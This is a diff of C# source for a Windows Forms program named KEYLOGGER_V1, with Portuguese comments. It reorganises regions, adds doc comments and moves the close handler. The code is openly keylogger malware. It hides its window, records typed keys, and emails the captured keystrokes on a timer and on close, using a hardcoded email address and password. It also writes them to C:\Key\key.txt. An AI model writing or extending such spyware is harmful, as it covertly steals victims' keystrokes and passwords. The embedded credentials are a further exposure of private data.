@@ -20,7 +20,13 @@ namespace KEYLOGGER_V1
 
         #endregion
 
-        #region Eventos
+        #region Eventos do Formulário
+        #region Form
+        /// <summary>
+        ///  Evento após carregar todas propriedades e recursos do Formulário
+        /// </summary>
+        /// <param name="sender">Objeto</param>
+        /// <param name="e">Definição do evento</param>
         private void FrmHome_Load(object sender, EventArgs e)                  //EVENTO: Inicialização do formulário, para verificações Iniciais.
         {
             Hide(true);
@@ -33,6 +39,28 @@ namespace KEYLOGGER_V1
             #endregion
 
         }
+
+        /// <summary>
+        ///  Evento antes do fechamento total do formulário
+        /// </summary>
+        /// <param name="sender">Objeto</param>
+        /// <param name="e">Definição do evento</param>
+        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
+        {
+            #region Gravação das informações
+            Gravacao gravacao = new Gravacao();
+            gravacao.Armazenar("OrionOficial@outlook.com", "Orion0f1c1al", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", "C:\\Key\\");
+            txtTextoDigitadoLimpo.Clear();
+            #endregion
+        }
+        #endregion
+
+        #region TextBox
+        /// <summary>
+        ///  Evento de alteração de texto do  campo [txtTextoDigitado] 
+        /// </summary>
+        /// <param name="sender">Objeto</param>
+        /// <param name="e">Definição do evento</param>
         private void txtTextoDigitado_TextChanged(object sender, EventArgs e)  //EVENTO: quando ouver uma alteração no texto, irá ser verificado as teclas.
         {
             String AtalhoDeVisibilidade = "[Ctrl][Delete][Esc]"; // Deixa Invisivel ou visivel
@@ -71,14 +99,14 @@ namespace KEYLOGGER_V1
             }
 
         }
-        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
-        {
-            #region Gravação das informações
-            Gravacao gravacao = new Gravacao();
-            gravacao.Armazenar("OrionOficial@outlook.com", "Orion0f1c1al", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", "C:\\Key\\");
-            txtTextoDigitadoLimpo.Clear();
-            #endregion
-        }
+        #endregion
+
+        #region Timer
+        /// <summary>
+        ///  Evento de termino do objeto Timer do [tmEnviarEmail]
+        /// </summary>
+        /// <param name="sender">Objeto</param>
+        /// <param name="e">Definição do evento</param>
         private void tmEnviarEmail_Tick(object sender, EventArgs e)            //EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
         {
             #region Gravação das informações
@@ -87,7 +115,8 @@ namespace KEYLOGGER_V1
             txtTextoDigitadoLimpo.Clear();
             #endregion
         }
-     
+
+        #endregion
         #endregion
 
         #region Metodos
